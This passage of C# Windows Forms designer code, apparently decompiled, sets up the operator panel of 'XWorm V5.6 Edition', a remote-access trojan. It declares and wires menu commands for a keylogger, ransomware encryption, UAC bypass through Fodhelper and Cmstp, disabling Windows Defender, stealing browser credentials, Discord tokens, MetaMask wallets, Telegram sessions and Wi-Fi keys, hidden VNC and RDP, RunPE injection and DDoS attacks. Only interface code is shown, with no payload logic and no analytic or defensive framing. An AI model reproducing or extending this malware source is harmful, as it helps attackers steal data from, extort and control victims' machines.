		this.Timer_Status = new System.Windows.Forms.Timer(this.components);
		this.NotifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
		this.Guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		this.ShowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RestartToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ExitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.performanceCounter2 = new System.Diagnostics.PerformanceCounter();
		this.performanceCounter1 = new System.Diagnostics.PerformanceCounter();
		this.ii = new System.Windows.Forms.ImageList(this.components);
		this.TimerTask = new System.Windows.Forms.Timer(this.components);
		this.ThumbnailCap = new System.Windows.Forms.Timer(this.components);
		this.ImageList1 = new System.Windows.Forms.ImageList(this.components);
		this.Lv4 = new System.Windows.Forms.ListView();
		this.Guna2ContextMenuStrip2_1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		this.ToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
		this.ImageList2 = new System.Windows.Forms.ImageList(this.components);
		this.Guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2Panel3 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2Panel4 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2Panel6 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2Button7 = new Guna.UI2.WinForms.Guna2Button();
		this.Guna2Button6 = new Guna.UI2.WinForms.Guna2Button();
		this.Guna2Button5 = new Guna.UI2.WinForms.Guna2Button();
		this.Guna2Button4 = new Guna.UI2.WinForms.Guna2Button();
		this.Guna2Button3 = new Guna.UI2.WinForms.Guna2Button();
		this.Guna2Button2 = new Guna.UI2.WinForms.Guna2Button();
		this.Guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
		//this.Guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		this.ToolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
		this.Guna2ContextMenuStrip2_2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		this.FromDiskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FromLinkToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FromMemoryToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.OpenUrlToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.VisibleToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.InvisibleToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.KeyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.WDExclusionToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RecoveryToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RunRecoveryToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ChromiumToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.DiscordTokenToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.MetaMaskToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.TelegramSessionToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.UpdateAllClientsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RemoveTaskToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.Guna2ContextMenuStrip2_3 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		this.InformationToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.MonitorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RunFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DiskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.LinkToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.MemoryToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RunPEToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.WebCamToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.MicrophoneToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.SystemSoundToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.OpenUrlToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.VisibleToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.InvisibleToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.OptionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.BlankScreenToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.EnableToolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
		this.DisableToolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
		this.RegeditToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.EnableToolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
		this.DisableToolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
		this.FirewallToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.EnableToolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
		this.DisableToolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
		this.TaskMgrToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.EnableToolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
		this.DisableToolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
		this.UACToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.EnableToolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
		this.DisableToolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
		this.UpdateToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.EnableToolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
		this.DisableToolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
		this.ResetScaleToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.InvokeBSODToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.DeleteRestoreToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.Net35InstallToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.UninstallPluginsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FileManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RecoveryOptionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RunRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ChromiumToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DiscordTokenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.TelegramSessionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ProductKeyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.MetaMaskToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.FileZillaToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.WifiKeysToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RegistryEditorToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ActiveWindowsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.TCPConnectionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.StartupManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ProcessManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ServiceManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ClipboardManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.InstalledProgramsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.VBNetCompilerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.DDosAttackToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.LocationManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PastimeToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.PowerToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.ShutdownToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RestartToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
		this.LogoffToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.Extra1ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ReportWindowToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.StartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.StopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PerformanceToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.EditHostsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.KeyLoggerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.OfflineToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.OnlineToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ClientChatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FilesSearcherToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.UACBypassToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RunAsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.FodhelperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CmstpToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CommandsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.MessageBoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.Extra2ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RansomwareToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.EncryptToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.DecryptToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ReverseProxyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.NgrokInstallerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.HiddenRDPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.HiddenBrowserToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.HiddenVNCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RunPEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.MemoryToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.HiddenAppsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.BotkillerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.WDKillerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.WDDisableToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.WDExclusionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ClientToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RestartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CloseToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.UninstallToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.UpdateToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.NoteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ClientFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.Guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2Panel5 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2NotificationPaint1 = new Guna.UI2.WinForms.Guna2NotificationPaint(this.components);
		this.Guna2HtmlToolTip1 = new Guna.UI2.WinForms.Guna2HtmlToolTip();
		this.PowerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.VoiceChatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.Lv1 = new XWorm.GListView0();
		this._IP = new System.Windows.Forms.ColumnHeader();
		this._Country = new System.Windows.Forms.ColumnHeader();
		this._ID = new System.Windows.Forms.ColumnHeader();
		this._Username = new System.Windows.Forms.ColumnHeader();
		this._Operating = new System.Windows.Forms.ColumnHeader();
		this._Group = new System.Windows.Forms.ColumnHeader();
		this._Date = new System.Windows.Forms.ColumnHeader();
		this._USB = new System.Windows.Forms.ColumnHeader();
		this._UAC = new System.Windows.Forms.ColumnHeader();
		this._Cam = new System.Windows.Forms.ColumnHeader();
		this._CPU = new System.Windows.Forms.ColumnHeader();
		this._GPU = new System.Windows.Forms.ColumnHeader();
		this._Ram = new System.Windows.Forms.ColumnHeader();
		this._Antivirus = new System.Windows.Forms.ColumnHeader();
		this._Note = new System.Windows.Forms.ColumnHeader();
		this._idle = new System.Windows.Forms.ColumnHeader();
		this._Ping = new System.Windows.Forms.ColumnHeader();
		this._ActiveWindow = new System.Windows.Forms.ColumnHeader();
		this.Lv2 = new XWorm.GListView0();
		this.ColumnHeader16 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader17 = new System.Windows.Forms.ColumnHeader();
		this.Lv3 = new XWorm.GListView0();
		this.ColumnHeader12 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader13 = new System.Windows.Forms.ColumnHeader();
		this.StatusStrip1.SuspendLayout();
		this.Guna2ContextMenuStrip2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter2).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter1).BeginInit();
		this.Guna2ContextMenuStrip2_1.SuspendLayout();
		this.Guna2Panel2.SuspendLayout();
		this.Guna2Panel6.SuspendLayout();
		this.Guna2ContextMenuStrip2.SuspendLayout();
		this.Guna2ContextMenuStrip2_2.SuspendLayout();
		this.Guna2ContextMenuStrip2_3.SuspendLayout();
		base.SuspendLayout();
        this.Timer_Ping.Tick += new System.EventHandler(Timer_Ping_Tick);
        this.Timer_Status.Tick += new System.EventHandler(Timer_Status_Tick);
        this.NotifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(NotifyIcon1_MouseDoubleClick);
        this.Lv1.MouseMove += new System.Windows.Forms.MouseEventHandler(Lv1_MouseMove);
        this.Lv1.KeyDown += new System.Windows.Forms.KeyEventHandler(Lv1_KeyDown);
        this.Lv1.SelectedIndexChanged += new System.EventHandler(Lv1_SelectedIndexChanged);
        this.TimerTask.Tick += new System.EventHandler(TimerTask_Tick);
        this.ThumbnailCap.Tick += new System.EventHandler(ThumbnailCap_Tick);
        this.Lv4.SelectedIndexChanged += new System.EventHandler(Lv4_SelectedIndexChanged);
        this.Guna2Button5.Click += new System.EventHandler(Guna2Button5_Click);
        this.Guna2Button4.Click += new System.EventHandler(Guna2Button4_Click);
        this.Guna2Button3.Click += new System.EventHandler(Guna2Button3_Click);
        this.Guna2Button2.Click += new System.EventHandler(Guna2Button2_Click);
        this.Guna2Button1.Click += new System.EventHandler(Guna2Button1_Click);
        this.Guna2TextBox1.TextChanged += new System.EventHandler(Guna2TextBox1_TextChanged);
        this.Guna2TextBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(Guna2TextBox1_KeyDown);
        this.ShowToolStripMenuItem.Click += new System.EventHandler(ShowToolStripMenuItem_Click);
        this.RestartToolStripMenuItem1.Click += new System.EventHandler(RestartToolStripMenuItem1_Click);
        this.ExitToolStripMenuItem.Click += new System.EventHandler(ExitToolStripMenuItem_Click);
        this.ToolStripMenuItem4.Click += new System.EventHandler(ToolStripMenuItem4_Click);
        this.ToolStripMenuItem6.Click += new System.EventHandler(ToolStripMenuItem6_Click);
        this.ToolStripMenuItem7.Click += new System.EventHandler(ToolStripMenuItem7_Click);
        this.Guna2Button6.Click += new System.EventHandler(Guna2Button6_Click);
        this.Guna2Button7.Click += new System.EventHandler(Guna2Button7_Click);
        this.KeyloggerToolStripMenuItem.Click += new System.EventHandler(KeyloggerToolStripMenuItem_Click);
        this.VisibleToolStripMenuItem2.Click += new System.EventHandler(VisibleToolStripMenuItem2_Click);
        this.InvisibleToolStripMenuItem2.Click += new System.EventHandler(InvisibleToolStripMenuItem2_Click);
        this.MetaMaskToolStripMenuItem2.Click += new System.EventHandler(MetaMaskToolStripMenuItem2_Click);
        this.DiscordTokenToolStripMenuItem1.Click += new System.EventHandler(DiscordTokenToolStripMenuItem1_Click);
        this.TelegramSessionToolStripMenuItem1.Click += new System.EventHandler(TelegramSessionToolStripMenuItem1_Click);
        this.FromDiskToolStripMenuItem.Click += new System.EventHandler(FromDiskToolStripMenuItem_Click);
        this.FromLinkToolStripMenuItem.Click += new System.EventHandler(FromLinkToolStripMenuItem_Click);
        this.FromMemoryToolStripMenuItem1.Click += new System.EventHandler(FromMemoryToolStripMenuItem1_Click);
        this.UpdateAllClientsToolStripMenuItem1.Click += new System.EventHandler(UpdateAllClientsToolStripMenuItem1_Click);
        this.RemoveTaskToolStripMenuItem1.Click += new System.EventHandler(RemoveTaskToolStripMenuItem1_Click);
        this.InformationToolStripMenuItem1.Click += new System.EventHandler(InformationToolStripMenuItem1_Click);
        this.DiskToolStripMenuItem.Click += new System.EventHandler(DiskToolStripMenuItem_Click);
        this.LinkToolStripMenuItem.Click += new System.EventHandler(LinkToolStripMenuItem_Click);
        this.MemoryToolStripMenuItem1.Click += new System.EventHandler(MemoryToolStripMenuItem1_Click);
        this.RunPEToolStripMenuItem2.Click += new System.EventHandler(RunPEToolStripMenuItem2_Click);
        this.VisibleToolStripMenuItem1.Click += new System.EventHandler(VisibleToolStripMenuItem1_Click);
        this.InvisibleToolStripMenuItem1.Click += new System.EventHandler(InvisibleToolStripMenuItem1_Click);
        this.ShellToolStripMenuItem.Click += new System.EventHandler(ShellToolStripMenuItem_Click);
        this.FileManagerToolStripMenuItem1.Click += new System.EventHandler(FileManagerToolStripMenuItem1_Click);
        this.RegistryEditorToolStripMenuItem1.Click += new System.EventHandler(RegistryEditorToolStripMenuItem1_Click);
        this.TCPConnectionsToolStripMenuItem.Click += new System.EventHandler(TCPConnectionsToolStripMenuItem_Click);
        this.ActiveWindowsToolStripMenuItem1.Click += new System.EventHandler(ActiveWindowsToolStripMenuItem1_Click);
        this.StartupManagerToolStripMenuItem1.Click += new System.EventHandler(StartupManagerToolStripMenuItem1_Click);
        this.ProcessManagerToolStripMenuItem1.Click += new System.EventHandler(ProcessManagerToolStripMenuItem1_Click);
        this.ServiceManagerToolStripMenuItem1.Click += new System.EventHandler(ServiceManagerToolStripMenuItem1_Click);
        this.ClipboardManagerToolStripMenuItem1.Click += new System.EventHandler(ClipboardManagerToolStripMenuItem1_Click);
        this.InstalledProgramsToolStripMenuItem1.Click += new System.EventHandler(InstalledProgramsToolStripMenuItem1_Click);
        this.DDosAttackToolStripMenuItem1.Click += new System.EventHandler(DDosAttackToolStripMenuItem1_Click);
        this.VBNetCompilerToolStripMenuItem1.Click += new System.EventHandler(VBNetCompilerToolStripMenuItem1_Click);
        this.LocationManagerToolStripMenuItem.Click += new System.EventHandler(LocationManagerToolStripMenuItem_Click);
        this.PastimeToolStripMenuItem1.Click += new System.EventHandler(PastimeToolStripMenuItem1_Click);
        this.ClientFolderToolStripMenuItem.Click += new System.EventHandler(ClientFolderToolStripMenuItem_Click);
        this.RestartToolStripMenuItem.Click += new System.EventHandler(RestartToolStripMenuItem_Click);
        this.CloseToolStripMenuItem1.Click += new System.EventHandler(CloseToolStripMenuItem1_Click);
        this.UninstallToolStripMenuItem1.Click += new System.EventHandler(UninstallToolStripMenuItem1_Click);
        this.UpdateToolStripMenuItem1.Click += new System.EventHandler(UpdateToolStripMenuItem1_Click);
        this.NoteToolStripMenuItem1.Click += new System.EventHandler(NoteToolStripMenuItem1_Click);
        this.MonitorToolStripMenuItem.Click += new System.EventHandler(MonitorToolStripMenuItem_Click);
        this.WebCamToolStripMenuItem1.Click += new System.EventHandler(WebCamToolStripMenuItem1_Click);
        this.MicrophoneToolStripMenuItem1.Click += new System.EventHandler(MicrophoneToolStripMenuItem1_Click);
        this.SystemSoundToolStripMenuItem1.Click += new System.EventHandler(SystemSoundToolStripMenuItem1_Click);
        this.EnableToolStripMenuItem6.Click += new System.EventHandler(EnableToolStripMenuItem6_Click);
        this.DisableToolStripMenuItem6.Click += new System.EventHandler(DisableToolStripMenuItem6_Click);
        this.EnableToolStripMenuItem7.Click += new System.EventHandler(EnableToolStripMenuItem7_Click);
        this.DisableToolStripMenuItem7.Click += new System.EventHandler(DisableToolStripMenuItem7_Click);
        this.EnableToolStripMenuItem8.Click += new System.EventHandler(EnableToolStripMenuItem8_Click);
        this.DisableToolStripMenuItem8.Click += new System.EventHandler(DisableToolStripMenuItem8_Click);
        this.EnableToolStripMenuItem9.Click += new System.EventHandler(EnableToolStripMenuItem9_Click);
        this.DisableToolStripMenuItem9.Click += new System.EventHandler(DisableToolStripMenuItem9_Click);
        this.EnableToolStripMenuItem10.Click += new System.EventHandler(EnableToolStripMenuItem10_Click);
        this.DisableToolStripMenuItem10.Click += new System.EventHandler(DisableToolStripMenuItem10_Click);
        this.EnableToolStripMenuItem11.Click += new System.EventHandler(EnableToolStripMenuItem11_Click);
        this.DisableToolStripMenuItem11.Click += new System.EventHandler(DisableToolStripMenuItem11_Click);
        this.ResetScaleToolStripMenuItem1.Click += new System.EventHandler(ResetScaleToolStripMenuItem1_Click);
        this.InvokeBSODToolStripMenuItem1.Click += new System.EventHandler(InvokeBSODToolStripMenuItem1_Click);
        this.DeleteRestoreToolStripMenuItem1.Click += new System.EventHandler(DeleteRestoreToolStripMenuItem1_Click);
        this.Net35InstallToolStripMenuItem1.Click += new System.EventHandler(Net35InstallToolStripMenuItem1_Click);
        this.RestartToolStripMenuItem4.Click += new System.EventHandler(RestartToolStripMenuItem4_Click);
        this.LogoffToolStripMenuItem.Click += new System.EventHandler(LogoffToolStripMenuItem_Click);
        this.DiscordTokenToolStripMenuItem.Click += new System.EventHandler(DiscordTokenToolStripMenuItem_Click);
        this.TelegramSessionToolStripMenuItem.Click += new System.EventHandler(TelegramSessionToolStripMenuItem_Click);
        this.ProductKeyToolStripMenuItem1.Click += new System.EventHandler(ProductKeyToolStripMenuItem1_Click);
        this.MetaMaskToolStripMenuItem1.Click += new System.EventHandler(MetaMaskToolStripMenuItem1_Click);
        this.FileZillaToolStripMenuItem1.Click += new System.EventHandler(FileZillaToolStripMenuItem1_Click);
        this.WifiKeysToolStripMenuItem1.Click += new System.EventHandler(WifiKeysToolStripMenuItem1_Click);
        this.StartToolStripMenuItem.Click += new System.EventHandler(StartToolStripMenuItem_Click);
        this.StopToolStripMenuItem.Click += new System.EventHandler(StopToolStripMenuItem_Click);
        this.PerformanceToolStripMenuItem1.Click += new System.EventHandler(PerformanceToolStripMenuItem1_Click);
        this.EditHostsToolStripMenuItem.Click += new System.EventHandler(EditHostsToolStripMenuItem_Click);
        this.OfflineToolStripMenuItem1.Click += new System.EventHandler(OfflineToolStripMenuItem1_Click);
        this.OnlineToolStripMenuItem1.Click += new System.EventHandler(OnlineToolStripMenuItem1_Click);
        this.ClientChatToolStripMenuItem.Click += new System.EventHandler(ClientChatToolStripMenuItem_Click);
        this.FilesSearcherToolStripMenuItem1.Click += new System.EventHandler(FilesSearcherToolStripMenuItem1_Click);
        this.CommandsToolStripMenuItem.Click += new System.EventHandler(CommandsToolStripMenuItem_Click);
        this.MessageBoxToolStripMenuItem.Click += new System.EventHandler(MessageBoxToolStripMenuItem_Click);
        this.RunAsToolStripMenuItem1.Click += new System.EventHandler(RunAsToolStripMenuItem1_Click);

        this.CmstpToolStripMenuItem.Click += new System.EventHandler(CmstpToolStripMenuItem_Click);
        this.EncryptToolStripMenuItem1.Click += new System.EventHandler(EncryptToolStripMenuItem1_Click);
        this.DecryptToolStripMenuItem1.Click += new System.EventHandler(DecryptToolStripMenuItem1_Click);
        this.ReverseProxyToolStripMenuItem1.Click += new System.EventHandler(ReverseProxyToolStripMenuItem1_Click);
        this.NgrokInstallerToolStripMenuItem.Click += new System.EventHandler(NgrokInstallerToolStripMenuItem_Click);

        this.HiddenRDPToolStripMenuItem.Click += new System.EventHandler(HiddenRDPToolStripMenuItem_Click);
        this.HiddenVNCToolStripMenuItem.Click += new System.EventHandler(HiddenVNCToolStripMenuItem_Click);
        this.RunPEToolStripMenuItem.Click += new System.EventHandler(RunPEToolStripMenuItem_Click);
        this.MemoryToolStripMenuItem2.Click += new System.EventHandler(MemoryToolStripMenuItem2_Click);
        this.BotkillerToolStripMenuItem.Click += new System.EventHandler(BotkillerToolStripMenuItem_Click);

        this.WDKillerToolStripMenuItem.Click += new System.EventHandler(WDKillerToolStripMenuItem_Click);
        this.WDDisableToolStripMenuItem.Click += new System.EventHandler(WDDisableToolStripMenuItem_Click);
        this.WDExclusionToolStripMenuItem.Click += new System.EventHandler(WDExclusionToolStripMenuItem_Click);
        this.WDExclusionToolStripMenuItem1.Click += new System.EventHandler(WDExclusionToolStripMenuItem1_Click);
        this.UninstallPluginsToolStripMenuItem.Click += new System.EventHandler(UninstallPluginsToolStripMenuItem_Click);

        this.RunRecoveryToolStripMenuItem.Click += new System.EventHandler(RunRecoveryToolStripMenuItem_Click);
        this.RunRecoveryToolStripMenuItem1.Click += new System.EventHandler(RunRecoveryToolStripMenuItem1_Click);
        this.FodhelperToolStripMenuItem.Click += new System.EventHandler(FodhelperToolStripMenuItem_Click);
        this.HiddenBrowserToolStripMenuItem.Click += new System.EventHandler(HiddenBrowserToolStripMenuItem_Click);
        this.HiddenAppsToolStripMenuItem.Click += new System.EventHandler(HiddenAppsToolStripMenuItem_Click);

        this.ChromiumToolStripMenuItem.Click += new System.EventHandler(ChromiumToolStripMenuItem_Click);
        this.ChromiumToolStripMenuItem1.Click += new System.EventHandler(ChromiumToolStripMenuItem1_Click);
        this.VoiceChatToolStripMenuItem.Click += new System.EventHandler(VoiceChatToolStripMenuItem_Click);

        this.StatusStrip1.BackColor = System.Drawing.Color.White;
		this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ToolStripStatusLabel1 });
		this.StatusStrip1.Location = new System.Drawing.Point(0, 423);
		this.StatusStrip1.Name = "StatusStrip1";
		this.StatusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
		this.StatusStrip1.Size = new System.Drawing.Size(915, 22);
		this.StatusStrip1.TabIndex = 2;
		this.StatusStrip1.Text = "StatusStrip1";
		this.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
		this.ToolStripStatusLabel1.Size = new System.Drawing.Size(13, 17);
		this.ToolStripStatusLabel1.Text = "..";
		this.Timer_Ping.Enabled = true;
		this.Timer_Ping.Interval = 30000;
		this.Timer_Status.Interval = 500;
		this.NotifyIcon1.ContextMenuStrip = this.Guna2ContextMenuStrip2;
		this.NotifyIcon1.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon1.Icon");
		this.NotifyIcon1.Text = "XWorm V5.6 Edition";
		this.NotifyIcon1.Visible = true;
		this.Guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.ShowToolStripMenuItem, this.RestartToolStripMenuItem1, this.ExitToolStripMenuItem });
		this.Guna2ContextMenuStrip2.Name = "Guna2ContextMenuStrip2";
		this.Guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
		this.Guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
		this.Guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(113, 74, 250);
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.Guna2ContextMenuStrip2.Size = new System.Drawing.Size(111, 70);
		this.ShowToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.ShowToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ShowToolStripMenuItem.Image");
		this.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem";
		this.ShowToolStripMenuItem.Size = new System.Drawing.Size(110, 22);
		this.ShowToolStripMenuItem.Text = "Show";
		this.RestartToolStripMenuItem1.BackColor = System.Drawing.Color.White;
